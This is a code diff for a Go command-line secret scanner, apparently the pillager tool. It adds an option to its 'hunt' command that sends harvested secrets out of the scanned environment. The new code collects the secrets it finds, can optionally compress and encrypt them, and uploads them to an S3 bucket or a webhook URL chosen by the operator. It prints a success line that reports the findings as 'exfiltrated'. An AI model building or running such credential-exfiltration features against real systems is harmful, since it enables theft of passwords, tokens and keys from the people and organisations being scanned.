@@ -4,10 +4,15 @@
 package commands
 
 import (
+	"context"
 	"fmt"
 	"os"
 	"runtime"
 
+	"github.com/brittonhayes/pillager"
+	"github.com/brittonhayes/pillager/pkg/exfil"
+	_ "github.com/brittonhayes/pillager/pkg/exfil/s3"       // Register S3 exfiltrator
+	_ "github.com/brittonhayes/pillager/pkg/exfil/webhook" // Register webhook exfiltrator
 	"github.com/brittonhayes/pillager/pkg/scanner"
 	"github.com/brittonhayes/pillager/pkg/tui/model"
 	tea "github.com/charmbracelet/bubbletea"
@@ -24,6 +29,19 @@ var (
 	templ       string
 	interactive bool
 	workers     int
+
+	// Exfiltration flags
+	exfilType      string
+	exfilCompress  bool
+	exfilEncrypt   string
+	s3Bucket       string
+	s3Region       string
+	s3Endpoint     string
+	s3Prefix       string
+	s3AccessKey    string
+	s3SecretKey    string
+	webhookURL     string
+	webhookHeader  []string
 )
 
 // huntCmd represents the hunt command.
@@ -83,6 +101,14 @@ var huntCmd = &cobra.Command{
 			return nil
 		}
 
+		// Exfiltrate findings if exfil type is specified
+		if exfilType != "" {
+			if err := exfiltrateFindings(results); err != nil {
+				return fmt.Errorf("exfiltration failed: %w", err)
+			}
+			fmt.Printf("[+] Successfully exfiltrated %d findings to %s\n", len(results), exfilType)
+		}
+
 		return s.Reporter().Report(os.Stdout, results)
 	},
 }
@@ -91,6 +117,58 @@ func runInteractive(h scanner.Scanner) error {
 	m := model.NewModel(h)
 	p := tea.NewProgram(m, tea.WithAltScreen())
 	return p.Start()
+}
+
+func exfiltrateFindings(findings []pillager.Finding) error {
+	// Build exfil config
+	cfg := exfil.Config{
+		Type:          exfilType,
+		EncryptionKey: exfilEncrypt,
+		Compress:      exfilCompress,
+		Options:       make(map[string]string),
+	}
+
+	// Add type-specific options
+	switch exfilType {
+	case "s3":
+		cfg.Options["bucket"] = s3Bucket
+		cfg.Options["region"] = s3Region
+		cfg.Options["endpoint"] = s3Endpoint
+		cfg.Options["prefix"] = s3Prefix
+		cfg.Options["access_key"] = s3AccessKey
+		cfg.Options["secret_key"] = s3SecretKey
+	case "webhook":
+		cfg.Options["url"] = webhookURL
+		// Parse headers
+		for _, header := range webhookHeader {
+			parts := splitHeader(header)
+			if len(parts) == 2 {
+				cfg.Options[parts[0]] = parts[1]
+			}
+		}
+	default:
+		return fmt.Errorf("unsupported exfil type: %s", exfilType)
+	}
+
+	// Create exfiltrator
+	exfiltrator, err := exfil.Create(cfg)
+	if err != nil {
+		return fmt.Errorf("failed to create exfiltrator: %w", err)
+	}
+	defer exfiltrator.Close()
+
+	// Exfiltrate findings
+	ctx := context.Background()
+	return exfiltrator.Exfiltrate(ctx, findings)
+}
+
+func splitHeader(header string) []string {
+	for i, c := range header {
+		if c == ':' {
+			return []string{header[:i], header[i+1:]}
+		}
+	}
+	return []string{header}
 }
 
 func init() {
@@ -103,6 +181,23 @@ func init() {
 	huntCmd.Flags().BoolVarP(&dedupe, "dedupe", "d", false, "deduplicate results")
 	huntCmd.Flags().Float64VarP(&entropy, "entropy", "e", 3.0, "minimum entropy value for results")
 	huntCmd.Flags().IntVarP(&workers, "workers", "w", runtime.NumCPU(), "number of concurrent workers")
+
+	// Exfiltration flags
+	huntCmd.Flags().StringVar(&exfilType, "exfil", "", "exfiltration type (s3, webhook)")
+	huntCmd.Flags().BoolVar(&exfilCompress, "exfil-compress", false, "compress findings before exfiltration")
+	huntCmd.Flags().StringVar(&exfilEncrypt, "exfil-encrypt", "", "encryption key (env:VAR, file:/path, or base64)")
+
+	// S3 flags
+	huntCmd.Flags().StringVar(&s3Bucket, "s3-bucket", "", "S3 bucket name")
+	huntCmd.Flags().StringVar(&s3Region, "s3-region", "us-east-1", "S3 region")
+	huntCmd.Flags().StringVar(&s3Endpoint, "s3-endpoint", "", "S3 endpoint URL (for MinIO, etc.)")
+	huntCmd.Flags().StringVar(&s3Prefix, "s3-prefix", "findings", "S3 object key prefix")
+	huntCmd.Flags().StringVar(&s3AccessKey, "s3-access-key", "", "S3 access key (or use AWS_ACCESS_KEY_ID env var)")
+	huntCmd.Flags().StringVar(&s3SecretKey, "s3-secret-key", "", "S3 secret key (or use AWS_SECRET_ACCESS_KEY env var)")
+
+	// Webhook flags
+	huntCmd.Flags().StringVar(&webhookURL, "webhook-url", "", "webhook URL for HTTP POST")
+	huntCmd.Flags().StringSliceVar(&webhookHeader, "webhook-header", []string{}, "webhook headers (format: 'Key:Value')")
 
 	// Bind flags to viper
 	viper.BindPFlag("dedupe", huntCmd.Flags().Lookup("dedupe"))
